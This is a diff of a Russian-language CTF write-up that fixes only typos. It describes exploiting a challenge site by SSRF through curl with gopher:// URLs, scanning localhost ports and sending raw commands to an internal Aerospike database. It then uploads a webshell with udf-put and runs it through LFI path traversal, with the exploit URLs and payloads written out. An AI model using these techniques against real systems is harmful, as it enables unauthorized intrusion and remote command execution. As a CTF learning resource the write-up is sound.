@@ -380,7 +380,7 @@ FLAG_IS: md5('!!N3ith3r__c0nf1rm_N0r_d3n141--')
 {% highlight ruby %}
 https://anonymizer.rosnadzorcom.ru/?url=http%3A%2F%2Flocalhost&page=curl&submit=+GO%21+.
 {% endhighlight %}
-Особенное внимание уделяем параметру page=curl(важно во время дирбаста заметить, что на сайте есть curl.php, и предпологаем что в php что-то по типу include('./'.$_GET["page"].'.php')). Сайт работает через curl_exec() скорее всего, а значит, если нет достаточной фильтрации входных данных, то можно использовать зачемательный протокол gopher:// , поднимаем сервер и пробуем, отправляес запрос вида
+Особенное внимание уделяем параметру page=curl(важно во время дирбаста заметить, что на сайте есть curl.php, и предполагаем что в php что-то по типу include('./'.$_GET["page"].'.php')). Сайт работает через curl_exec() скорее всего, а значит, если нет достаточной фильтрации входных данных, то можно использовать зачемательный протокол gopher:// , поднимаем сервер и пробуем, отправляем запрос вида
 {% highlight ruby %}
 https://anonymizer.rosnadzorcom.ru/?url=gopher://IP:PORT/_HELLO&page=curl&submit=+GO%21+
 {% endhighlight %}
@@ -394,7 +394,7 @@ HELLO
 {% highlight ruby %}
 https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:80/_GET%20/&page=curl&submit=+GO%21+
 {% endhighlight %}
-Видим тот же самый сайт, все прекрасно, можно сканировать открытые порты на localhost, отправляем этот запрос в Intruder или пишем сами скрипт(лучше самому написать, так как открытый порт будем определять по таймингу респонса) и ставим пейлодом порт от 1 до 5000(можно хоть 65000, но там ничего нет). Нвходим открытый порты 3000,3001,3003, идем гуглить какой продукт изпользует эти порты(находим кстати не на первой же странице, надо немного постараться) узнаем, что это aerospike db (http://www.aerospike.com/). Читаем доки и узнаем что порт 3003 - телнет сервис, а 3000 - основной. пробуем обратиться к телнету
+Видим тот же самый сайт, все прекрасно, можно сканировать открытые порты на localhost, отправляем этот запрос в Intruder или пишем сами скрипт(лучше самому написать, так как открытый порт будем определять по таймингу респонса) и ставим пейлоудом порт от 1 до 5000(можно хоть 65000, но там ничего нет). Находим открытые порты 3000,3001,3003, идем гуглить какой продукт изпользует эти порты(находим кстати не на первой же странице, надо немного постараться) узнаем, что это aerospike db (http://www.aerospike.com/). Читаем доки и узнаем что порт 3003 - телнет сервис, а 3000 - основной. пробуем обратиться к телнету
 {% highlight ruby %}
 https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:3003/_namespaces%0a%0d/&page=curl&submit=+GO%21+
 {% endhighlight %}
@@ -402,7 +402,7 @@ https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:3003/_namespaces%0a%0
 {% highlight ruby %}
 https://anonymizer.rosnadzorcom.ru/?url=gopher://localhost:3003/_namespaces%250a%250d/&page=curl&submit=+GO%21+
 {% endhighlight %}
-Появляется новая проблема, телнет не сбрасывает соединение, чтобы мы смогли увидеть результат команды, придется образать к основному сервису, для этого надо понять как он работает, скачиваем aerospike db скачиваем aerospike command line tools. Включаем wireshark и обращаемся из cli к aerospike.
+Появляется новая проблема, телнет не сбрасывает соединение, чтобы мы смогли увидеть результат команды, придется обращаться к основному сервису, для этого надо понять как он работает, скачиваем aerospike db скачиваем aerospike command line tools. Включаем wireshark и обращаемся из cli к aerospike.
 {% highlight ruby %}
 02 01 00 00 00 00 00 0f namespace/test 0a
 {% endhighlight %}
@@ -414,12 +414,12 @@ https://anonymizer.rosnadzorcom.ru/?url=gopher://127.0.0.1:3000/_%2502%2501%2500
 {% highlight ruby %}
 objects=1;sub_objects=0;tombstones=0;master_objects=1;master_sub_objects=0;master_tombstones=0;prole_objects=0;prole_sub_objects=0;prole_tombstones=0;stop_writes=false;hwm_breached=false;
 {% endhighlight %}
-Пишем скрипт, который сразу кодирует комманды и отправляет из на сервер через gopher, эдакий SSRF shell для aerospike-a. 
-Смотрим что есть в базе, база оказывается пуста, что же делать, идем читать документацию aerospike узнаем что в нем есть возможность запускать LUA скрипты, а еще эти же скрипты можно загрузить на сервер при помощи команды udf-put, и так готовим наш вебшелл и пытаемся отправить запрос надеясь, что aerospike-у будет пофиг на экстеншн
+Пишем скрипт, который сразу кодирует комманды и отправляет их на сервер через gopher, эдакий SSRF shell для aerospike-a. 
+Смотрим что есть в базе, база оказывается пуста, что же делать, идем читать документацию aerospike и узнаем что в нем есть возможность запускать LUA скрипты, а еще эти же скрипты можно загрузить на сервер при помощи команды udf-put, и так готовим наш вебшелл и пытаемся отправить запрос надеясь, что aerospike-у будет пофиг на экстеншн
 {% highlight ruby %}
 udf-put:filename=webshell.php;udf-type=LUA;content-len=XX;content=BASE64BASE64BASE64BASE64;
 {% endhighlight %}
-Смотрим в доках что lua скрипты загружаются в /opt/aerospike/usr/udf/lua/, осталось просто обратиться к нашему вебшеллу через
+Смотрим в доках что lua скрипты загружаются в /opt/aerospike/usr/udf/lua/, осталось просто обратиться к нашему вебшеллу через LFI
 {% highlight ruby %}
 https://anonymizer.rosnadzorcom.ru/?page=../../../../../../../opt/aerospike/usr/udf/lua/webshell&cmd=ls
 {% endhighlight %}
